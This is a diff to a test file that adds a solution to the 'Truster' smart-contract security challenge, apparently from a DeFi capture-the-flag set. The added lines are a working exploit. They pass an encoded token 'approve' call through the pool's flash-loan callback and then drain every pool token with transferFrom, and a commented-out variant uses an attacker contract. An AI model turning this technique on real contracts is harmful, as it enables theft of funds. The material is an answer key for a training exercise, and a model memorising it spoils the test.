@@ -23,6 +23,17 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const maliciousData = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+
+        /* Solution 1: Two transactions */
+        await pool.connect(player).flashLoan(0, player.address, token.address, maliciousData);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+        
+        /* Solution 2: Use malicious contract */
+        // const maliciousData2 = token.interface.encodeFunctionData("transferFrom", [pool.address, player.address, TOKENS_IN_POOL]);
+        // let trusterAttacker = await (await ethers.getContractFactory('TrusterAttacker', player)).deploy(pool.address, token.address);
+        // trusterAttacker.attack(token.address, maliciousData);
     });
 
     after(async function () {
@@ -37,4 +48,3 @@ describe('[Challenge] Truster', function () {
         ).to.equal(0);
     });
 });
-
